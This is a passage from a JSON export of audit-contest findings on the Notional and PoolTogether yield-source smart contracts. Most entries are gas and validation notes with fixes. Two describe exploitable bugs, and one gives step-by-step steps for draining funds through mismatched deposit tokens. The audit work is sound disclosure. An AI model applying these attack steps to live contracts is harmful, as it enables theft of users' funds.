abicoder v2", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/5", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The code contains \"pragma experimental ABIEncoderV2;\" In the later Solidity versions it is no longer necessary to use the \"experimental\" version. Using experimental constructions is not recommended for production code.  See: https://docs.soliditylang.org/en/v0.8.7/layout-of-source-files.html#abiencoderv2  ## Proof of Concept https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/Router.sol ```JS pragma experimental ABIEncoderV2; ```  ## Tools Used  ## Recommended Mitigation Steps Replace pragma experimental ABIEncoderV2; with pragma abicoder v2;  And make sure you use at least solidity version 0.7.5    "}, {"title": "Double check for \"birthday\" collision", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/4", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function getRouterImplementation of Router.sol checks the selectors of functions and calls the appropriate function. Selectors are only 4 bytes long so there is a theoretical probability of a collision (e.g. two functions having the same selector).  This is comparable to the \"birthday attack\" : https://en.wikipedia.org/wiki/Birthday_attack The probability of a collision when you have 93 different functions is 10^\u22126. Due to the structure of the Router.sol, the solidity compiler does not prevent collisions  ## Proof of Concept https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/Router.sol#L97 ```JS   function getRouterImplementation(bytes4 sig) public view returns (address) {         if (             sig == NotionalProxy.batchBalanceAction.selector ||             sig == NotionalProxy.batchBalanceAndTradeAction.selector ||      ...  ```  ## Tools Used  ## Recommended Mitigation Steps Double check (perhaps via a continuous integration script / github workflow), that there are no collisions of the selectors.  "}, {"title": "executing instruction outside code can lead to failing transfer", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/3", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "executing instruction outside code can lead to failing transfer"}, {"title": "Lack of address Validation ", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/2", "labels": ["bug", "duplicate", "0 (Non-critical)"], "target": "2021-08-notional-findings", "body": "Lack of address Validation "}, {"title": "Self transfer can lead to unlimited mint", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/1", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  Omik   # Vulnerability details  ## Impact The implementation of the transfer function in the https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol is the different from the usual erc20 token transfer function, this happen because it count the incentive that the user get, but the with self tranfer it can lead to unlimited mint, because https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#L278 it makes the amount to negative, but in the https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#L279 it return the value to amount that not negative, so in the https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol#L281-282 it finalize the positive value only since the negative value is change to the positive value, you can interact this transfer function through https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/adapters/nTokenERC20Proxy.sol  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  ## Tools Used Manual  ## Recommended Mitigation Steps add (sender != recipient)  "}, {"title": "Possible enhancements to supply/redeem full balance", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/79", "labels": ["bug", "0 (Non-critical)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Consider adding functions in SwappableYieldSource to supply/redeem the whole balance of the user, so users will not need to pass an exact amount in case they want to fully join/exit the pool.  Also, you can consider joining the BoostedVault for some extra rewards, however, I think then funds will need to be locked for some time for the rewards to start accruing.   "}, {"title": "Validation", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/74", "labels": ["bug", "1 (Low Risk)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function supplyTokenTo should check that mAssetAmount and creditsIssued > 0 and to != address(0) or if empty to address is provided, it can replace it with msg.sender to prevent potential burn of funds. function redeemToken should check that mAssetAmount and creditsBurned > 0. function transferERC20 should similarly validate erc20Token, to and amount parameters. function _mintShares requires that shares > 0, while _burnShares lacks such requirement.   "}, {"title": "Retrieve stuck tokens from MStableYieldSource", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/73", "labels": ["bug", "1 (Low Risk)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Tokens sent directly to the MStableYieldSource will be stuck forever. Consider adding a function that allows an admin to retrieve stuck tokens: * Balance of mAsset - total deposited amount of mAsset; * Similar with credit balances as credits are issued as a separate erc20 token. * All the other tokens.  "}, {"title": "approveMax in the constructor", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/72", "labels": ["bug", "0 (Non-critical)", "mStableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "approveMax in the constructor"}, {"title": "Incorrect comment about memory", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/69", "labels": ["bug", "0 (Non-critical)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Incorrect comment  [Context](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L47)  ``` diff modified   contracts/MStableYieldSource.sol @@ -44,7 +44,7 @@ contract MStableYieldSource is IYieldSource, ReentrancyGuard {       constructor(ISavingsContractV2 _savings) ReentrancyGuard() {          // As immutable storage variables can not be accessed in the constructor, -        // create in-memory variables that can be used instead. +        // create in-stack variables that can be used instead.          IERC20 mAssetMemory = IERC20(_savings.underlying());           // infinite approve Savings Contract to transfer mAssets from this contract ```  The comment and therefore the variable name aren't accurate. The value would be in stack, and not memory.  However, this doesn't affect the code in any way.   "}, {"title": "[Optimization] Use 0.8.4 in MStableYieldSource.sol", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Use 0.8.4  The version 0.8.4 includes an important low level inliner that can save gas. Upgrading `MStableYieldSource.sol` from 0.8.2 to 0.8.4 should improve gas.   "}, {"title": "Gas: swapYieldSource", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  cmichel   # Vulnerability details  The `SwappableYieldSource.swapYieldSource` function receives a `_newYieldSource` as a parameter and reads a `_currentYieldSource` from storage. A single storage read should therefore be enough for the entire function and sub-calls.  However, the `_transferFunds` function reads the new yield source from storage again, performing a second storage read. This can be optimized by `_transferFunds` taking an `oldYieldSource` and `newYieldSource` as parameters instead.   "}, {"title": "`redeemToken` can fail for certain tokens", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/61", "labels": ["bug", "3 (High Risk)", "SwappableYieldSource"], "target": "2021-07-pooltogether-findings", "body": "`redeemToken` can fail for certain tokens"}, {"title": "`_requireYieldSource` does not check return value", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/60", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  cmichel   # Vulnerability details  The `_requireYieldSource` function performs a low-level status code and parses the return data even if the call failed as it does not check the first return value (`success`). It could be the case that non-zero data is returned even though the call failed, and the function would return `true`.  Check the return value or perform a high-level call using the `_yieldSource` interface.  "}, {"title": "Declaring functions as `external` to save gas", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  In general, if not called by the contract itself, public functions can be declared as `external` to save gas.  ## Proof of Concept  Referenced code: [MStableYieldSource.sol#L61](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L61) [MStableYieldSource.sol#L69](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L69) [SwappableYieldSource.sol#L67](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L67) [SwappableYieldSource.sol#L98](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L98) [SwappableYieldSource.sol#L219](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L219)  ## Recommended Mitigation Steps  Change `public` to `external` in the referenced functions.  "}, {"title": "Use `abi.encodePacked` for gas optimization", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/53", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  Changing the `abi.encode` function to `abi.encodePacked` at line 77 of `SwappableYieldSource` can save gas since the `abi.encode` function pads extra null bytes at the end of the call data, which is unnecessary. Also, in general, `abi.encodePacked` is more gas-efficient.  ## Proof of Concept  Referenced code: [SwappableYieldSource.sol#L77](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L77)  [Solidity-Encode-Gas-Comparison](https://github.com/ConnorBlockchain/Solidity-Encode-Gas-Comparison)  ## Recommended Mitigation Steps  Change `abi.encode` to `abi.encodePacked` at line 77.  "}, {"title": "Inconsistent balance when supplying transfer-on-fee or deflationary tokens", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/52", "labels": ["bug", "2 (Med Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `supplyTokenTo` function of `SwappableYieldSource` assumes that `amount` of `_depositToken` is transferred to itself after calling the `safeTransferFrom` function (and thus it supplies `amount` of token to the yield source). However, this may not be true if the `_depositToken` is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount.  ## Proof of Concept  Referenced code: [SwappableYieldSource.sol#L211-L212](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L211-L212)  ## Recommended Mitigation Steps  Get the actual received amount by calculating the difference of token balance before and after the transfer. For example, re-writing line 211-212 to:  ```solidity uint256 balanceBefore = _depositToken.balanceOf(address(this)); _depositToken.safeTransferFrom(msg.sender, address(this), amount); uint256 receivedAmount = _depositToken.balanceOf(address(this)) - balanceBefore; yieldSource.supplyTokenTo(receivedAmount, address(this)); ```  "}, {"title": "Yield sources cannot be swapped back", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/51", "labels": ["bug", "2 (Med Risk)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "Yield sources cannot be swapped back"}, {"title": "Use of safeApprove will always cause approveMax to revert", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/47", "labels": ["bug", "2 (Med Risk)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Unlike SwappableYieldSource which uses safeIncreaseAllowance to increase the allowance to uint256.max, mStableYieldSource uses OpenZeppelin\u2019s safeApprove() which has been documented as 1) Deprecated because of approve-like race condition and 2) To be used only for initial setting of allowance (current allowance == 0) or resetting to 0 because it reverts otherwise.  The usage here is intended to allow increase of allowance when it falls low similar to the documented usage in SwappableYieldSource. Using it for that scenario will not work as expected because it will always revert if current allowance is != 0. The initial allowance is already set as uint256.max in constructor. And once it gets reduced, it can never be increased using this function unless it is invoked when allowance is reduced completely to 0.  ## Proof of Concept  https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L60-L65  https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L51  https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L135-L143  https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/081776bf5fae2122bfda8a86d5369496adfdf959/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol#L37-L57   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Use logic similar to SwappableYieldSource instead of using safeApprove().  "}, {"title": "Overly permissive access control lets anyone approve max amount", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/46", "labels": ["bug", "1 (Low Risk)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Overly permissive access control to lets anyone approve max amount. This may be ok but is inconsistent with SwappableYieldSource.sol where the similar function is onlyOwner.   ## Proof of Concept  https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L61-L65  https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L133-L135   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Check requirements/spec and ensure this is ok or else add Ownable inheritance to enforce onlyOwner for this function.  "}, {"title": "onlyOwner for approveMaxAmount() is risky", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "onlyOwner for approveMaxAmount() is risky"}, {"title": "Missing zero-address checks", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/41", "labels": ["bug", "1 (Low Risk)", "mStableYieldSource", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "Missing zero-address checks"}, {"title": "Single-step process for critical ownership transfer/renounce is risky", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "Single-step process for critical ownership transfer/renounce is risky"}, {"title": "Initialization function can be front-run with malicious values", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/39", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "Initialization function can be front-run with malicious values"}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/37", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  1. https://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexStakingWrapper.sol#L114-L114  ```solidity uint256 startIndex = rewardsLength - 1; ```  `rewardsLength - 1` will never underflow.  2. https://github.com/code-423n4/2022-01-yield/blob/e946f40239b33812e54fafc700eb2298df1a2579/contracts/ConvexYieldWrapper.sol#L82-L85  ```solidity=82 bool isLast = i == vaultsLength - 1; if (!isLast) {     vaults_[i] = vaults_[vaultsLength - 1]; } ```  "}, {"title": "Redundant zero-address check", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/33", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The zero-address check on owner is present even in transferOwnership() which makes it redundant.  ## Proof of Concept  https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L110   https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/081776bf5fae2122bfda8a86d5369496adfdf959/contracts/access/OwnableUpgradeable.sol#L68  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Remove explicit check to rely on the one in transferOwnership().  "}, {"title": "Changing function visibility from public to external can save gas", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Assuming the initialize() function is going to be called from a deployment script, its visibility can be made external.   For public functions, the input parameters are copied to memory automatically which costs gas. If a function is only called externally, making its visibility as external will save gas because external function\u2019s parameters are not copied into memory and are instead read from calldata directly.  ## Proof of Concept  https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L98-L104   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change visibility to external.  "}, {"title": "SwappableYieldSource: setYieldSource() should check no deposited tokens in current yield source", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/31", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "SwappableYieldSource: setYieldSource() should check no deposited tokens in current yield source"}, {"title": "SwappableYieldSource: Missing same deposit token check in transferFunds()", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/29", "labels": ["bug", "3 (High Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `transferFunds()` will transfer funds from a specified yield source `_yieldSource` to the current yield source set in the contract `_currentYieldSource`. However, it fails to check that the deposit tokens are the same. If the specified yield source's assets are of a higher valuation, then a malicious owner or asset manager will be able to exploit and pocket the difference.  ### Proof of Concept  Assumptions:  - `_yieldSource` has a deposit token of WETH (18 decimals) - `_currentYieldSource` has a deposit token of DAI (18 decimals) - 1 WETH > 1 DAI (definitely true, I'd be really sad otherwise)  Attacker does the following:  1. Deposit 100 DAI into the swappable yield source contract 2. Call `transferFunds(_yieldSource, 100 * 1e18)`     - `_requireDifferentYieldSource()` passes     - `_transferFunds(_yieldSource, 100 * 1e18)` is called         - `_yieldSource.redeemToken(_amount);` \u2192 This will transfer 100 WETH out of the `_yieldSource` into the contract         - `uint256 currentBalance = IERC20Upgradeable(_yieldSource.depositToken()).balanceOf(address(this));` \u2192 This will equate to \u2265 100 WETH.         - `require(_amount <= currentBalance, \"SwappableYieldSource/transfer-amount-different\");` is true since both are `100 * 1e18`         - `_currentYieldSource.supplyTokenTo(currentBalance, address(this));` \u2192 This supplies the transferred 100 DAI from step 1 to the current yield source     - We now have 100 WETH in the swappable yield source contract 3. Call `transferERC20(WETH, attackerAddress, 100 * 1e18)` to withdraw 100 WETH out of the contract to the attacker's desired address.   ### Recommended Mitigation Steps  `_requireDifferentYieldSource()` should also verify that the yield sources' deposit token addresses are the same.  ```jsx function _requireDifferentYieldSource(IYieldSource _yieldSource) internal view {     require(address(_yieldSource) != address(yieldSource), \"SwappableYieldSource/same-yield-source\");   require(_newYieldSource.depositToken() == yieldSource.depositToken(), \"SwappableYieldSource/different-deposit-token\"); } ```  "}, {"title": "SwappableYieldSource.sol: Wrong reporting amount in FundsTransferred() event", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/28", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `FundsTransferred()` event in `_transferFunds()` will report a smaller amount than expected if `currentBalance > _amount`.  This would affect applications utilizing event logs like subgraphs.  ### Recommended Mitigation Steps  Update the event emission to `emit FundsTransferred(_yieldSource, currentBalance);`  "}, {"title": "SwappableYieldSource.sol: Shorten revert messages", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "SwappableYieldSource.sol: Shorten revert messages"}, {"title": "SwappableYieldSource.sol: Save depositToken as a storage variable", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  Assuming that `depositToken` of a yield source doesn't change, it would make sense to save its value as a storage variable in the contract as well, so that an external call to `yieldSource` to retrieve it can be avoided whenever it is needed.  ### Recommended Mitigation Steps  Define `address public override depositToken;` or `IERC20Upgradeable public depositToken;` which gets initialized in the `initialize()` function. The nice thing is that it also doesn't need to be updated when swapping sources because a requirement is that the new yield source must have the same deposit token.  As an optimization, since the `_requireYieldSource()` function already retrieves the `depositToken` address, it can return it so that its value need not be externally retrieved again in the `initialize()` function.  The `depositToken()` function can be removed if the former suggestion is implemented (ie. `address public override depositToken`).  Then, `yieldSource.depositToken()` can be replaced with `depositToken` where applicable (with appropriate casting).  A part of the former implementation is provided below.  ```jsx address public override depositToken;  function initialize(...) {  address depositTokenAddress = _requireYieldSource(_yieldSource);  yieldSource = _yieldSource;   depositToken = depositTokenAddress;  ...  IERC20Upgradeable(depositTokenAddress).safeApprove(address(_yieldSource), type(uint256).max); }  function _requireYieldSource(IYieldSource _yieldSource) internal view returns (address depositTokenAddress) {  ...  (depositTokenAddress) = abi.decode(depositTokenAddressData, (address)); }  // function depositToken() can be removed // yieldSource.depositToken() can be replaced with depositToken in other functions // Example: _setYieldSource function _setYieldSource(IYieldSource _newYieldSource) internal {  _requireDifferentYieldSource(_newYieldSource);  // Commented out check below should be shifted to inside _requireDifferentYieldSource()  // Optimization: it can also return depositToken to avoid another SLOAD  // similar to _requireYieldSource() above  // require(_newYieldSource.depositToken() == depositToken, \"SwappableYieldSource/different-deposit-token\");    yieldSource = _newYieldSource;   IERC20Upgradeable(depositToken).safeApprove(address(_newYieldSource), type(uint256).max);    emit SwappableYieldSourceSet(_newYieldSource); } ```  "}, {"title": "MStableYieldSource.sol: Optimise balanceOf()", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "MStableYieldSource.sol: Optimise balanceOf()"}, {"title": "MStableYieldSource.sol: approveMax can use mAsset instead of savings.underlying()", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The immutable `mAsset` is assigned to the immutable `savings` contract. Hence, we can avoid an external function call to the savings contract in the `approveMax` function by replacing it with `mAsset`.   ### Recommended Mitigation Steps  ```jsx function approveMax() public {  mAsset.safeApprove(address(savings), type(uint256).max);   emit ApprovedMax(msg.sender); } ```  "}, {"title": "Increase Solc Optimiser Runs", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "Increase Solc Optimiser Runs"}, {"title": "Lack of zero address validation in _requireDifferentYieldSource()", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/17", "labels": ["bug", "0 (Non-critical)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "Lack of zero address validation in _requireDifferentYieldSource()"}, {"title": "Amount should > 0 in supplyToken() and RedeemToken()  in SwappableYieldSource.sol", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/16", "labels": ["bug", "0 (Non-critical)", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "Amount should > 0 in supplyToken() and RedeemToken()  in SwappableYieldSource.sol"}, {"title": "No input validation for  while setting up value for immutable state variables", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/15", "labels": ["bug", "1 (Low Risk)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact Since  immutable state variable cant be change after initialization in constructor, their value should be checked before initialization       constructor(ISavingsContractV2 _savings) ReentrancyGuard() {             // @audit --> there should be a input validation          // As immutable storage variables can not be accessed in the constructor,         // create in-memory variables that can be used instead.         IERC20 mAssetMemory = IERC20(_savings.underlying());          // infinite approve Savings Contract to transfer mAssets from this contract         mAssetMemory.safeApprove(address(_savings), type(uint256).max);          // save to immutable storage         savings = _savings;         mAsset = mAssetMemory;          emit Initialized(_savings);     }   ## Proof of Concept  https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L45  ## Tools Used no tool used  ## Recommended Mitigation Steps add a require condition to validate input values  "}, {"title": "onlyOwnerOrAssetManager can swap Yield Source in SwappableYieldSource at any time, immediately rugging all funds from old yield source", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/14", "labels": ["bug", "3 (High Risk)", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "onlyOwnerOrAssetManager can swap Yield Source in SwappableYieldSource at any time, immediately rugging all funds from old yield source"}, {"title": "SwappableYieldSource._requireYieldSource is not a guarantee that you are interacting with a valid yield source", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/11", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "SwappableYieldSource._requireYieldSource is not a guarantee that you are interacting with a valid yield source"}, {"title": "[MStableYieldSource.sol] Public functions that should be declared as external to save gas", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "mStableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  maplesyrup   # Vulnerability details  ## Impact  This is a gas optimization, does not affect the contract negatively, only optimizes it.  ## Proof of Concept  According to Slither Analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external), functions that are never called within the contract should be declared as external to save gas for the contract.  In this case, there were only 2 functions in the contract that were found that should be declared as external for further gas optimization.  -----------  Code Snippet:  function approveMax() public {...} <---- should be declared external  (contracts/yield-source/MStableYieldSource.sol, lines #61-65)  function depositToken() public view override returns (address underlyingMasset) {...} <---- should be declared external  (contracts/yield-source/MStableYieldSource.sol, lines #69-71)   ------------  Console output:  INFO:Detectors: approveMax() should be declared external:  - MStableYieldSource.approveMax() (contracts/yield-source/MStableYieldSource.sol#61-65) depositToken() should be declared external:  - MStableYieldSource.depositToken() (contracts/yield-source/MStableYieldSource.sol#69-71) Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external  ## Tools Used  PoolTogether Contracts Solidity (v 0.7.4) Hardhat (v 2.5.0) Yarn (v 1.22.10) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for PoolTogether Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts via artifacts  "}, {"title": "Variable name or isInvalidYieldSource is confusion", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/8", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _requireYieldSource of the contract SwappableYieldSource has a state variable: isInvalidYieldSource  You would expect isInvalidYieldSource == true would mean the yield source in invalid However in the source code  isInvalidYieldSource == true mean the yield source is valid.  This is confusing for readers and future maintainers. Future maintainers could easily make a mistake and thus introduce vulnerabilities.  ## Proof of Concept // https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol#L74 function _requireYieldSource(IYieldSource _yieldSource) internal view {     require(address(_yieldSource) != address(0), \"SwappableYieldSource/yieldSource-not-zero-address\");     (, bytes memory depositTokenAddressData) = address(_yieldSource).staticcall(abi.encode(_yieldSource.depositToken.selector));     bool isInvalidYieldSource;     if (depositTokenAddressData.length > 0) {       (address depositTokenAddress) = abi.decode(depositTokenAddressData, (address));       isInvalidYieldSource = depositTokenAddress != address(0);     }     require(isInvalidYieldSource, \"SwappableYieldSource/invalid-yield-source\");   }  ## Tools Used  ## Recommended Mitigation Steps Change isInvalidYieldSource to isValidYieldSource   "}, {"title": "_requireYieldSource not always called", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/7", "labels": ["bug", "1 (Low Risk)", 